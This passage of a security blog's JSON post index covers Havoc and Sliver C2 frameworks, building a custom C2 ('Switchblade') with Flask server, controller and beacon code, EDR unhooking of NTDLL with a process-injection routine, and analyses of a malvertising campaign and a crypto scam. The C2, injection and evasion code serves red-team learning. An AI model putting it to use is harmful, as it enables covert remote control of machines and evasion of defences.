other.After taking all this into account and developing our executable for the shellcode, we can see that the detectionlevels has dropped from 26 to 16. That’s not ideal, but if your target platform is Microsoft, you’ve made it past stage 1 with only a few changes.While using Havoc, it felt like their target audience was professionals who are experienced with other C2 platformsand want something that they can build off of on their own. It’s hard to get leadership buy in on a project that isonly maintaned by three people and doesn’t have a company backing it like BishopFox, so it’s hard to say how likelyyou are to encounter it in an enterprise. For those who really enjoy working in a GUI though, this will definitely scratch that itch.SliverLet’s now shift a little and check out Sliver. Sliver is completely terminal based meaning if you need a GUI to be able to visualize things, this won’t work for you. The documentation is expansive and intimidating, which is great, and you can type help for any function. Sliver also lets you set expiration dates for beacons, so they stop working after a set time.Sliver gives you everything and expects you know what to do with it. If you don’t know what to do with it, there’s a help dialogue for each option, but aside from that you are left to figure it out. Just check out the options for compilingan implant.If you don’t know why you might want to disable the Shikata-Ga-Nai shellcode encoder, you’re offered no explanation.There are numerous guides available online for Sliver, which lowers the learning curve significantly and if you wouldlike to get started, these are almost mandatory readings. Some can be found here.The linked reading does a deep dive into Slivers code and finds some interesting shortcuts taken by the developers.For example, generating stagers under the hood is handled through MSFVenom and, while you can specify a DNS name,only hardcoded IPs are passed. This is not publicly documented and a potential drawback when trying to fly under the radar.Again, we will be compiling and outputting shellcode for us to further obfuscate and hide. This can be done with the -f flag.Because Sliver does not make it obvious what their execution and injection methods are like Havoc does, we’ll have to do some digging. Looking at the task_windows.go file, VirtualAlloc and CreateRemoteThread are both used to allocate and execute the in memory objects. Really interestingly, BishopFox has gone out of their way to implement their own syscallspackage, which only has the commands that they will need to use. It’s a smart way of limiting bloat and reducing imports.For comparison, 7zip has 69 imports from Kernel32 alone. This is definitely a key piece as well in reducing their detectionrate combined with EDR sometimes not being equipped to analyze Go binaries.Sliver also has its own methods for evasion, though this is not something the authors have focused heavily on. They providetwo functions that work in tandem in order to accomplish this. The first is RefreshPE which reloads the .text section ofa file from disk.The second is what they call writeGoodBytes. This function takes a process name and a few other variables and proceeds to reload the clean version of a dll into the current processes memory through the first function mentioned. This is called through err := evasion.RefreshPE('c:\\windows\\system32\\ntdll.dll'). Do note, to do this they allocated RWXmemory sections, which will set off EDR. Havoc also allocates memory in the same way, so it’s a knock against both.Now that we have an idea of how things are executed, we can go back to loading our shellcode into the resource section of our executable. Without even encrypting it, we see a strikingly lower detection rate than Havocs shellcode loaded the same way.A final piece to touch on, BOFs. Sliver allows operators to port over custom beacon object files that were written forCobaltstrike, as well as downloading prebuilt ones. Let’s see how easy they are to drop. Sliver uses somethingcalled Armory to manage these in a sort of extension manner. You can list extensions available through armory and installthem through armory install. Then, once you’ve gotten the BOFs installed, you hop into a session for a beacon and can runany of them just by typing their name and the flags that they require. This is very reminiscent of Metasploit modules andis intuitive to use and figure out. In fact, the whole program is reminiscent of Metasploit down to the help dialogue and how information is presented. This is not surprising, Sliver utilizes MSF internally and has built in functionality thatallows operators to do things like inject MSF payloads.Sliver had a lot of touches to it that really gave it the feel of an enterprise ready software. There’s a reputablecompany backing it, it has touches like beacon kill dates built in, and there’s a wide range of support for expandingthe software while staying within their ecosystem such as with BOFs. It’s no surprise that threat actors have caughtonto this framework and are integrating it with more and more campaigns. Microsoft has even noted that it is being usedin tandem with Cobaltstrike in some attacks.How can you expand on them?HavocCustom agents are a little tricky to figure out but there are examples provided. It will take some trial and error on yourend to determine the exact way to call arguments and add functionality, but CodeXTF2 was kind enough to include their owndemo agent written in Python as a demonstration for ease of understanding. Aside fromcustom agents, if you wish to add your own functionality to the teamserver, the codebase is vast and somewhat poorly commented which makes customization not the easiest.SliverSliver allows you to use beacon object files from Cobaltstrike to extend the post exploitation capabilities of theframework. While this isn’t necessarily a custom agent, this allows customization of agents to add further capabilities.To the unfamiliar, BOF are compiled C programs that are position independent code. Meaning that like Donut, no matterwhere it is placed in memory, it can execute. BOFs are injected directly into the beacon process typically, avoidingIoC’s associated with alternative approaches like execute-assembly which spawns a new empty process to run these assemblies in. Cobaltstrike never intended for BOFs to be executing long-running commands, that’s what execute-assembly,is for. Instead, these are for quick functions that return data shortly after launch. Sliver including these as a methodfor expanding functionality is a very neat approach. Read more about BOFs in the sources section. Regarding their codebaseit’s only marginally better commented with comments above primary functions describing what they do, but very little otherwise.This is disappointing to see, I wish commenting code was a more common practice as it helps new people get up to speedwith each functions purpose much quicker.Why might you want one over the other?Havoc The GUI is very intuitive and well thought out. Visualizing compromised machines and SSH tunnels was intelligently setup. Less can be more. Giving people less to work with means they go deeper on working with what they have. Breeds innovation.Havoc has the more user-friendly GUI of the two and makes it easy to start and deploy listeners and implants.If you’re wanting to get an introduction to C2s and customization, their GUImakes it much easier for newer operators to get accustomed to the environment. The profiles also work more intuitivelythan Slivers method of saving configurations for listeners and implants by having you edit a JSON file. The roundrobintechnique of hosts and URIs is also very clever, allowing much more randomness to be added, which it makes the defendersjob that much harder.Sliver Multi platform framework. Deeper resources to put into development. BOFs implementation is very smooth. More listener options like wireguard and mTLS.If you want the end game experience of free C2’s, this hands down goes to Sliver with their implementation of BOFs.Sliver also has agents that can be deployed to not only Windows machines, but also Mac and Linux. On top of this, theirdefault detection rate with shellcode was also much lower. These can all be attributed to the number of resources thatBishopFox has to throw at things compared to Havocs development team. Sources (BOF) https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/ (BOF) https://www.cobaltstrike.com/blog/writing-beacon-object-files-flexible-stealthy-and-compatible/ https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399 https://github.com/BishopFox/sliver https://github.com/HavocFramework/Havoc https://mez0.cc/posts/detecting-syscalls-with-fennec/" }, { "title": "Breaking Down Creating A Redteam Framework", "url": "/posts/Breaking-Down-Creating-A-Redteam-Framework/", "categories": "", "tags": "", "date": "2022-12-16 00:00:00 +0000", "snippet": "A Quick Review Of Where We StartedSwitchblade started out about a year ago with an idea taken from the leaked CIA toolset. The tool was called Switchblade,and it used mutual TLS in order to route b...", "content": "A Quick Review Of Where We StartedSwitchblade started out about a year ago with an idea taken from the leaked CIA toolset. The tool was called Switchblade,and it used mutual TLS in order to route beacons checking in versus nosy blue team defenders trying to figure out wherethis beacon was reaching out to. It’s a fairly simple nginx configuration that used the proxy pass method in order tosend people who didn’t authenticate to a bogus page or a whole other server entirely. Really it was the beacon, an nginx configuration file, and a netcat listener. But from this came came the desire to build it out to be more. It was around this time I was reading every update that Nighthawk published and I wanted to push Switchblade to be more than just asimple executable and netcat listener. And now we’re here!Be forewarned, if you don’t like programming, the whole rest of this is dedicated to talk aboutprogramming and decisions made.Breaking It DownLet’s break down all the pieces into their respective chunks for an easier time analysing them.The BackendA good solid backend is critical to a functioning redteam framework. Without a management system that works and remembers what beacon is what,you will quickly lose track of who is who. Then you also have to think about how these beacons will communicate with the backend that is dollingout their commands and decoding the results.To this end, Flask emerged as the easiest way to manage both the tracking method and command relay. If we store the beacons as a UUID HTMLfile, they’re all unique and we can quickly assign them new commands to execute through an HTTP GET request, getting the results back in a POST.I also needed a way to manage running this Flask server while simultaeneously reading back results, sending updates, and general beacon management. But running this concurrently while Flask was running was not feasible. Flask, once started, blocks further input from the CLI. I could mess withconcurrancy and threading, or I could deploy gRPC. I chose the latter. gRPC is a wonderfultool that was developed by Google for interacting with a number of microservices running in their data centers. It’s a remote procedure call that is designed specifically for what we are looking to do, non interruptive interaction.Let’s take a quick look at how intial beacon contact is handled through Flask after the server is started:@app.route(\"/\")def home(): # Grab the appsessionid value from the headers val = request.headers['APPSESSIONID'] if set(val).difference(string.ascii_letters + string.digits): # We're not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: message = \"whoami\" print(f'headers:{val}') # create a new page for the UUID we got from the headers with open(f\"{val}.html\", \"w\") as f: f.write(message) return ('')Here, when a beacon first checks in, we create an HTML file named after their UUID that they set.To avoid any nefariour command injection through the APPSESSIONID parameter, we filter out anything not needed for the UUID.Further requests from the beacon are sent to their dedicated UUID URL:@app.route('/&lt;path:filename&gt;', methods=['GET'])def index(filename): if request.method == 'GET': bID = {request.headers['APPSESSIONID']} name = request.headers['RESPONSE'] print(f'Host {bID} grabbed command') bID = str(bID) if set(bID).difference(string.ascii_letters + string.digits): # We're not going to bother with input sanitization here # If we receive special characters just drop it entirely pass elif set(name).difference(string.ascii_letters + string.digits): # We're not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: with open(f'{bID}.html') as f: content = f.readlines() for line in content: cmd = line conn.hset('beacons', f'{bID}', f'{cmd}') # Add the beacon ID and command to the redis DB date = datetime.datetime.now() conn.hset('beacons', f'{date}', f'{bID} + {cmd}') # Create cmd history conn.hset('beacons', f'{name}', f'{bID}') return send_from_directory('.', filename) return jsonify(request.data)The beacon sends a GET for its specific page and again we are just dropping requests with special characters. Once it findsthe page, we read the command out of it and respond back with what should be executed, also adding a command history to a Redis database.Finally, to get the results of the command:@app.route(\"/schema\", methods=['POST'])def results(): if request.method == 'POST': bID = {request.headers['APPSESSIONID']} bID = str(bID) if set(bID).difference(string.ascii_letters + string.digits): # We're not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: total = f'Result: {request.data} from beacon: {bID}' response = request.data response = str(response) response = response.strip() print(response) conn.hset(\"beacons\", bID, total) return 'HELO'We use the request.data method as a part of Flask in order to get the contents of the POST request. We then write theresults of the command to the Redis database.Then we come to the gRPC implementation. There’s much more that goes into this than just the classes here, the protobuff.protofile outlines the message types like string and bool as well as defining our expected results. For this post, however, wewill only be looking at the Python class portion.class UnaryService(pb2_grpc.UnaryServicer): def __init__(self, *args, **kwargs): pass def GetServerResponse(self, request, context): # We need an ID (ID for beacon) and message (What to tell the beacon) message = request.message ID = request.bID opt = request.opt if set(ID).difference(string.ascii_letters + string.digits): # We're not going to bother with input sanitization here # If we receive special characters just drop it entirely pass else: if opt == 'SC': # If option is to set command, then write it to the file with open(f\"{ID}.html\", \"w\") as f: f.write(message) result = f'Received command, wrote {message} to file {ID}' result = {'message': result, 'received': True} return pb2.MessageResponse(**result) elif opt == 'GR': # If option is to get the returned results of a beacon, page the Redis DB for the results res = conn.hget('beacons', f'{ID}') res = str(res) result = f'Getting status of beacon {ID}: {res}' result = {'message': result, 'received': True} return pb2.MessageResponse(**result) else: passThis class is designed to take input from the controller program and do a select number of things. We can eitherset a command or get the returned result. Depending on what is selected, the Redis databaseis paged looking for different things. This is then communicated over the protobuff back to the controller.There are a number of issues with this design that are not addressed here. First, if there is not a reverse proxy in front of the listener that’s routing bad requests away or something similar, then someone could flood the server with requests togenerate enough new HTML files to cause a denial of service. Additionally, there is nothing verifying commands sent to beaconsso someone could intercept them and issue their own commands to be executed. Solving the latter issue will be a matter ofcommand signing in order to verify legitimacy, but that is still to be implemented.The ControllerTo interact with the backend management, we have a controller that uses the aforementioned gRPC in order to facilitate this.class UnaryClient(object): \"\"\" Client for gRPC functionality \"\"\" def __init__(self): self.host = 'localhost' self.server_port = 50051 # instantiate a channel self.channel = grpc.insecure_channel( '{}:{}'.format(self.host, self.server_port)) # bind the client and the server self.stub = pb2_grpc.UnaryStub(self.channel) def get_url(self, message, beaconID, opt): \"\"\" Client function to call the rpc for GetServerResponse \"\"\" message = pb2.Message(bID=beaconID, message=message, opt=opt) print(f'{message}') return self.stub.GetServerResponse(message)This takes an input in the form of beaconID; commandToSet; choice where the choice is if you want to set a command or get the results.The Message properties are pre-defined in the protobuff.proto file as three string parameters, and the GetServerResponse is defined to return a simple message. gRPC does a lot of heavy lifting for us here.In order to actually send the command through the UnaryClient, the following function was used:def SendCommand(): ''' This uses gRPC to talk with the C2 We take the command to run and the beaconID to update and write it to the beacons file The C2 awaits the POST response and then sends that back over here :param command: The command to run :param beaconID: The beacon we want to target :return: Get the result of the command ''' beaconID = input(\"Input beacon ID &gt; \") command = input(\"If setting new command &gt; \") opt = input(\"Get Results (GR) or Set Command (SC) &gt; \") client = UnaryClient() result = client.get_url(message=command, beaconID=beaconID, opt=opt) print(f'{result}')We use the get_url method defined in the UnaryClient class in order to send this newly constructed message.The BeaconThe beacon is the most critical part to a redteam framework. If it’s poorly written, then alerts will pop and data will be corrupted,completely negating any benefits gained from performing these emulations. Upper management is already hesitant to do such tests, so poorly run ones will only further cement why they dislike them.Diving into the beacon, it was rewritten in two new languages for this. That was Go and C#.I had a few different motivations for doing so. The primary one was I felt like I reached the limits of Python. If I wanted to do any more specialized evasion stuff,I would need to import CTypes and at that point, why not just use C right? Additionally, with Go and C#, I could build the final beacon to be compatible forany system as opposed to just an .exe for Windows or just a .py script for Nix systems.The final overarching reason for doing so was also just to learn more. C# is incredibly powerful as outlined in previous posts here and elsewhere.You can unhook NTDLL, overwrite memory locations with what you think should go there, inject shellcode, and so on. Also note, a big reason that Virustotal does not flag these files is not because of any special evasion implemented, but because of their previously unknown structure making static analysis almost useless.Let’s start with how it went with Go first.Go was without a doubt far quicker to transition from Python to than C#. The syntax was very similar and libraries felt like they functioned much the same way. For instance, a GET request in Go would look like this:client := http.Client{} // Make our web client structurereq, err := http.NewRequest(\"GET\", \"http://google.com\", nil) // Define a new requestreq.Header.Add(\"User-Agent\", 'Im a super nifty header') // Add some cool new headersresp, err := client.Do(req) // Send it offAnd the same thing in Python:headers = { 'User-Agent': 'Im a super nifty header' # Set up a cool header}requests.get(f'http://google.com', headers=headers) # Send the requestGo requires you to do a little more setup than Python, but otherwise it’s much the same.This can be seen again in the command execution function. First is how it’s performed in Go:cmd := exec.Command(\"cmd.exe\", \"/C\", beacon_command) // exec.Command returns the Cmd struct to execute the named program with the given arguments.result, _ := cmd.Output() // And then get the output, _ here is to grab any errorshostname := []byte(result)And again in Python:command = ['cmd.exe', '/c', beacon_command] # Forming the layout of the command hereprocess = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)out, err = process.communicate()hostname = out.decode()A lot of time was spent on figuring out how commands should be executed. If it’s too obvious that it’s coming from a web request, the EDR willflag it. I spent a while going back and forth on how this should be done. I wanted to execute the command under an entirely new process that wouldn’t inherit any data from the parent process so as to avoid linking back.It’s actually really neat how this functions though. If you include creationflags=0x00000008, then you get a fully independant process who’s parent has died for all intents and purposes, but the command spawned still persists. But this had drawbacks. I couldn’t get the command output on things like dir and that’s a deal breaker for general execution.This is still viable though for edge case scenarios like spawning new persistent processes or sacrificial processes whos context we canexecute commands in to avoid crashing the primary process.In the end, the flag for detached processes was dropped in favor of more reliable general command execution. close_fds gets us half way there by keeping the parent file descriptors from being copied to the subprocess though.The overall detection for the Go beacon was pretty low. No one on Antiscan picked it up:And only 6 vendors picked it up on Virustotal:These low detection rates can primarily be attributed to how Golang is compiled, though I was able to knock Microsoft off the detection list by firstassigning the retrieved command to a new variable as opposed to passing it directly to be executed. One other point on Go, typically beacons generatedfrom it are very hard for AV to detect. This is due to them statically linking all the necessary libraries needed for compiling, which bumps the filesize up past what some AV’s can handle scanning. This isn’t a new tactic either, the Commie malware family padded 64MB of data to their compiled executables in order to avoid being scanned.Now how did it go with C#?I originally wanted to use C++ for this actually, but encountered a number of issues that C# had already resolved.The crux of the Switchblade communication design is GET and POST web requests and, surprisingly, C++ does not have an easy nativeway to perform these. You have to import another library in order to do this. So not a big deal, go to GitHub, grab one, import it. Ah but the one you grabbed doesn’t compile with the latest version of Visual Studio you have, so should you troubleshoot the compatability issue or use the 2019version over the 2022 version? I’m sure more experienced developers more familiar with C++ are shouting at this with an easy solution, but in that momentit was just very confusing to figure out.Using C# though was much easier comparitively. What took essentially one line in Python, took a few more in C#, but the end result was a very stable HTTP structure.And this was all with builtin structures, no downloading 3rd party libraries from Github and installing them yourself and troubleshooting what version of VS they weremade for, it just worked.using (client) { client.BaseAddress = new Uri(\"https://eoqqzdfuzmgq7gg.m.pipedream.net/\"); HttpResponseMessage response = client.GetAsync(\"\").Result; response.EnsureSuccessStatusCode(); string result = response.Content.ReadAsStringAsync().Result; Console.WriteLine(\"Result: \" + result); }Pretty nifty right?The original goal with using C++ was also to be able to do a bunch of advanced memory things, like injecting shellcode into running processes.C#, by nature of being a C based language, has all these tools to do memory modification that you would expect with C++! You still havethings like CreateRemoteThread, WriteProcessMemory, and LoadLlibraryA.For example, look at the following code taken from Codingvision.net:public static int Main() { // the target process - I'm using a dummy process for this // if you don't have one, open Task Manager and choose wisely Process targetProcess = Process.GetProcessesByName(\"testApp\")[0]; // geting the handle of the process - with required privileges IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id); // searching for the address of LoadLibraryA and storing it in a pointer IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\"); // name of the dll we want to inject string dllName = \"test.dll\"; // alocating some memory on the target process - enough to store the name of the dll // and storing its address in a pointer IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // writing the name of the dll there UIntPtr bytesWritten; WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten); // creating a thread that will call LoadLibraryA with allocMemAddress as argument CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero); return 0; }This reads strikingly similar to C++ functions designed to do the same thing. The point being that by using C# instead of C++, there’s very little sacrificed.Go was evidently easier to transition to, but C# definitely had more to teach me. Go was very forgiving with how the program coud be laid outwhile with C#, if you got the function declaration wrong, nothing would work. C# was also very interesting from a compilation standpoint. Theprogram could be compiled down to a DLL through the shortcut ctrl shft b or an executable for Windows or Ubuntu with dotnet publish -c Release -r win10-x64 without issue,and this opens up even more avenues of exploitation. The detection rate for each file was also increadibly low:What Was LearnedIt is exhausting keeping up with all the issues that are discovered along the way, but that’s the case with any project this size.Regardless of how tiring it was, learning how to use gRPC and how to build the same application in Python, C#, and Go was really rewarding. Comparing the different detection rates between languages was interesting and shows that engines still have a long wayto go with analysis, so implementing additional protections that look at behaviour is very important.Some may be wondering why the only method implemented in the beacon is direct command execution. Why not put in other tools like registry modification,file deletion, file upload, and SMB communication that don’t go through the command prompt? These are not off the table at all and all are good ideas, but for the original purposes of this project, being able to execute arbitrary commands was enough as it could do most of these functions anyways, just in a much more bulky and cumbersome manner.Another question may be why use Flask, why not handle the HTTP requests through other methods like in Go? A valid question! The primaryreason for using Flask was that it was the quickest way to build it out in Python, which is the language I know the strongest. Flask hasa bunch of great features as well like being able to serve TLS secured connections, though this can be worked around again using an nginxfront end. Because I was able to handle everything very intuitively through Flask, I could spend more time focusing on other aspects of the framework. Or another way to put it, if you cook a lot, is to bake the bread and buy the butter." }, { "title": "Malvertising Continued", "url": "/posts/Malvertising-Continued/", "categories": "", "tags": "", "date": "2022-11-17 00:00:00 +0000", "snippet": "Another fake ad, another fake productWow, there’s been a lot of malvertising recently. The last post was on a bitcoin scam and it looks like we’re continuing this trend.Some of you might remember b...", "content": "Another fake ad, another fake productWow, there’s been a lot of malvertising recently. The last post was on a bitcoin scam and it looks like we’re continuing this trend.Some of you might remember back in 2021, there was an ad on Google pointing to a website that was hosting a fake versionof lightshot. When downloaded, this installed a remote assistance tool alongside the real software that allowed an attacker to connect in and drop further malware. Well, this is obviously a great way to spread your malware as youinstantly become the top result on Google, and we can see this in the latest scam taking advantage of it.Giipm - An image editing softwareWait that’s not right. Gimps the software, so what’s Giipm? This is called typosquatting. The name is similar to gimp.org, and you’d be forgiven for looking at this and thinkingat first that the name is the same. But if you go to download this, you’re given a URL that is not at all relatedto Gimp. Originally, this was a discord link:But since then the site has been updated to use the following:The TTPsThe functionality of the malware originally had it execute a powershell script to sleep 15 secondsIt would then reach out to a Russian IP and download a PNG.This PNG, however, was not actually a PNG. It contained bytecode and upon examination, this bytecode appeared to be XOR encoded.If this is XOR encoded, then the key was either sent with the file or it’s hardcoded into the program. Unfortunately, none of the strings from the primary setup file worked as key and there was nothing sent in the communication logs either that would work. It’s not 100% clear though if this is encoded. Pasting it into x64dbg,we can see other information.Turning back to the dropper, putting the Setup.exe file in PEstudio we can see a number of very odd strings.It looks like the installer uses Oracles Virtualbox installer to kick off the setup, possibly attempting to piggybackoff of their trusted and signed software so the attackers don’t need to figure that out on their own. It was at thispoint I wanted to see if the attackers were hiding shellcode in the .ico included resources, a very common evasiontechnique.Unfortunately, that wasn’t the case here and the icon files were just that. But! A fun feature of Virustotal is thatit shows you files that also include the file you uploaded. So we can see that the attackers have tested their payloadmultiple times on Virustotal.The Updated TTPsThe malware campaign is under active development, as evident by the IPs changing, the download URL changing to something more legitimate and harder to take down than a Discord hosted EXE, and the deliverable no longer being byte code hiding in a PNG file.Instead of downloading further malware to run, we can see that the initial dropper is only receiving instructions to lookin common places for crypto wallets.We can also glean some new information from the dropper itself.The authors were kind enough to include some debug symbols and more identifying information.This is quite different from the original dropper which just tried to piggyback off Virtualboxes installer. This to meis further indication that the campaign is still under active development and may even have a new goal. What this newgoal is, apart from being just a stealer, is not entirely clear to me and they may have detection in place to preventthe payload from running on a VM. The overarching lesson though from this is that you cannot trust Google ads and youmust be vigilant about the URLs you click on." }, { "title": "Do You Want To Be A Millionaire", "url": "/posts/Do-You-Want-To-Be-A-Millionaire/", "categories": "", "tags": "", "date": "2022-10-18 00:00:00 +0000", "snippet": "Do You Want To Be A Millionaire?I got the weirdest phishing email the other day. It was a link to a cryptocurrency exchange called protoncoin[.]net with a usernameand password. So naturally, I chos...", "content": "Do You Want To Be A Millionaire?I got the weirdest phishing email the other day. It was a link to a cryptocurrency exchange called protoncoin[.]net with a usernameand password. So naturally, I chose to go there and attempt to log in! They wanted a new phone number to enable MFAsince the account had such a large amount of money, so I made a fake number and set that up. I finally log in, and whatdo I see?Yeah, um, wow that’s a big number just sitting in an account that I now “own”. So what’s the catch, how is the scammergoing to make money because no one just donates 158 BTC to strangers.There’s Gotta Be A Catch“How can I get the money out of here” is the first question running through my head. Ignoring the feasibility of getting this moved from BTC to USD that I can actually spend without the IRS having an aneurysm, how can I movethis into a wallet I actually own instead of sitting on a random exchange that doesn’t allow new user signups.The astute among you have probably noticed already the “Withdraw” tab along the top bar, so let’s check it out.Ok so it seems you can either withdraw into another wallet or directly into your bank. However, bank deposits are frozen at this time (because this exchange is not at all real) so withdrawing to another wallet is our only option.Ah, the first catch. I cannot withdraw the whole account immediately, I have to send a verification amount of $2.No big deal, send that and move on to trying to withdraw the rest.I knew it had to be here somewhere. In order to withdraw the full amount in the account, I would need to bring the account balance up by, at the time of writing, $550~. No, I’m not going to deposit money into here. It’s like theNigerian Prince scam but updated for cryptocurrency - you give me money so I can give you money.What’s The Actual Scam?So what’s the actual scam and who’s operating this? The financial part is clear, they want you to deposit money. But who is running this operation?The verification withdrawal I had to do into my wallet was legit and verified on the chain, and I am now $2 richer from it. However, this doesn’t mean there is actually 158 BTC residing here. There’s no recovery information attached to the account, so my best theory is that the site owners are operating this scam and can pull the rug out on any accountthat hits this BTC goal. Backing this up, the domain appears to only be two weeks old as of posting.But from the first image, we can see that there are supposedly transactions on this account dating back to 2021. Looking this domain up further on a WhoIs site, the site is registered in Hong Kong which is a stark difference fromthe UK which the site alludes to at the footer of their webpage.There are numerous other errors suggesting that the site was not coded by a native English speaker either. Lookingback through the messages I received while trying to withdraw the BTC, there were a lot of small mistakes that areeasy to overlook. Things like not capitalizing your “I” when used on its own, or how the sentence “To reduce cases of error withdrawals from new portfolios” just reads very oddly.It was fun for a time to pretend I was a Bitcoin millionaire though." }, { "title": "How AV Hooks NTDLL", "url": "/posts/Ever-wondered-how-AV-knows/", "categories": "low-level, TECHNICAL, offensive-security", "tags": "redteam", "date": "2022-09-23 00:00:00 +0000", "snippet": "How Does AV Know?Have you ever wondered how AV knows what that the application you’re trying to run is malicious when it doesn’t have a known signature?NTDLL is the answer.Before we beginIt’s the f...", "content": "How Does AV Know?Have you ever wondered how AV knows what that the application you’re trying to run is malicious when it doesn’t have a known signature?NTDLL is the answer.Before we beginIt’s the first post on the new website, and we finally can include Markdown code blocks! No more screenshots of code! Blogger has served its purpose well, but it’s finally time to move on to more adaptable hosting options. With that out of the way, the first post on the new site is going to be talking about a very common EDR evasion techniques and how to spot it.This is something that has been discussed a lot before and probably won’t be new to many, but even in 2022 it’s still overlooked by EDR vendors, so it’s worth going over.What is NTDLL?In the simplest form, it exports the Windows Native API. Since it would be incredibly insecure to allow user mode applications direct access to manipulate the kernel, Windows instead allows you to interact with it through the Native API which is then mapped to Syscalls.These Syscalls then are mapped via the system service descriptor table (SSDT) to the kernel functions memory address.Things like WriteProcessMemory or CreateRemoteThread all go through here and have their own NT API equivalent - NtWriteVirtualMemory and NtCreateThreadEx respectively.Then, once they have found their API equivalent call, the memory location that the loaded copy of NTDLL has is referenced.And yes! You can completely avoid having to use these exported functions by just using the Syscalls instead, i.e. Syswhispering.This comes with its own challenges though when manually implemented as these Syscall numbers reference different memory addresses in the system service descriptor table with each update.So if you want to avoid NTDLL and use Syscalls, use Syswhisper - it cuts out the headaches and figures out the correct memory address for you.How does AV hook NTDLL?As indicated above, NTDLL is used for a bunch of internal actions so, for the EDR, setting interrupt points to examine what kind of API requests are being made is critical.Your typical EDR will modify the loaded version to allow it to send off suspicious function calls, such as below with CreateRemoteThread.In this screenshot provided by MDSec, Cylance has implemented a jump point for this function call so that it can inspect what exactly is being performed before passing it back to the original process.EDR will typically do this for every function that can be abused. But each EDR is built differently so while Cylance might have this jmp here, perhaps Crowdstrike does not. Just something to keep in mind.Unhooking for fun and profitWe know what NTDLL is and how it’s used and we also know how EDR puts jump points into it in order to examine suspicious calls. The next step after this is how can we defeat this process?void removeCylanceHook(const char* dll, const char* apiName, char code) { DWORD old, newOld; void* procAddress = GetProcAddress(LoadLibraryA(dll), apiName); printf(\"[*] Updating memory protection of %s!%s\\n\", dll, apiName); VirtualProtect(procAddress, 10, PAGE_EXECUTE_READWRITE, &amp;old); printf(\"[*] Unhooking Cylance\\n\"); memcpy(procAddress, \"\\x4c\\x8b\\xd1\\xb8\", 4); *((char*)procAddress + 4) = code; VirtualProtect(procAddress, 10, old, &amp;newOld);} The above snippet is taken from MDSec here.The key part to highlight is you can see there is a new value being copied to a memory location.Here they are overwriting this process address with the original bytes pointing to the kernel functions memory address.Every memory address exported from the Native API in fact will start with these bytes. After implementing this, when the application continues execution, it will no longer have a jump instruction to Cylance’s analysis.printf(\"[*] Opened target process %d\\n\", processID);printf(\"[*] Allocating memory in target process with VirtualAllocEx\\n\");void *alloc = VirtualAllocEx(proc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);if (alloc == (void*)0) { printf(\"[!] Error: Could not allocate memory in target process\\n\"); return 1;}printf(\"[*] Allocated %d bytes at memory address %p\\n\", sizeof(buf), alloc);printf(\"[*] Attempting to write into victim process using WriteProcessMemory\\n\");if (WriteProcessMemory(proc, alloc, buf, sizeof(buf), NULL) == 0) { printf(\"[!] Error: Could not write to target process memory\\n\"); return 1;}printf(\"[*] WriteProcessMemory successful\\n\");// Remove the NTDLL.DLL hook added by userland DLLremoveCylanceHook(\"ntdll.dll\", \"ZwCreateThreadEx\", 0xBB);printf(\"[*] Attempting to spawn shellcode using CreateRemoteThread\\n\");HANDLE createRemote = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);printf(\"[*] Success :D\\n\");When this is run, before getting to the CreateRemoteThread function, the application calls the aforementioned removeCylanceHook function with the API name for ZwCreateThreadEx.The Zw prefix here is important as this ensures that the kernel mode variant for the function is overwritten to point away from the injected EDR jump, whereas specifying Nt would not have done.So now when our application hits the CreateRemoteThread call, it asks the loaded copy of NTDLL to pass on the request to the SSDT that now has the hook for Cylance removed and functions normally.Pros &amp; ConsSo why go through all this work when Syswhisper makes it far simpler?Well, as Captmeelo found, EDR could be looking for the syscall instruction in the binary. A simple bypass though in this case is to replace syscall in the asm file of Syswhisper with int 2EH which is a legacy instruction for referencing kernel mode. However this also has issues. int 2EH is trivial to hunt for so now we’re entering the territory of adding an egg-hunter to the code in order to find and replace items in memory at run time.We’d replace syscall with a random string in the Syswhispers asm file and then at run time implement the egg-hunter to change our previously random string to syscall.This definitely provides a high level of evasion, but you have to weigh the cost in time versus the advantage gained.References https://www.codeproject.com/Articles/1191465/The-Quest-for-the-SSDTs https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/ https://www.geoffchappell.com/studies/windows/win32/ntdll/api/index.htm https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/ https://www.ired.team/offensive-security/defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/ https://rioasmara.com/2021/06/20/25-bytes-of-every-function-in-ntdll/" }, { "title": "Please pardon the mess!", "url": "/posts/A-quick-note/", "categories": "UPDATES, NON-TECHNICAL", "tags": "non-technical", "date": "2022-09-06 00:00:00 +0000", "snippet": "Please pardon the mess as the old Blogger site is transitioned here. Some of the posts got saved oddly, some of them have poor formatting because I made poor design choices, and some are missing fo...", "content": "Please pardon the mess as the old Blogger site is transitioned here. Some of the posts got saved oddly, some of them have poor formatting because I made poor design choices, and some are missing for one reason or another. The DNS also needs updating so stay tuned" }, { "title": "Setting Up A Phishing Platform With GoPhish", "url": "/posts/setting-up-phishing-platform-with/", "categories": "", "tags": "", "date": "2022-08-29 18:56:00 +0000", "snippet": 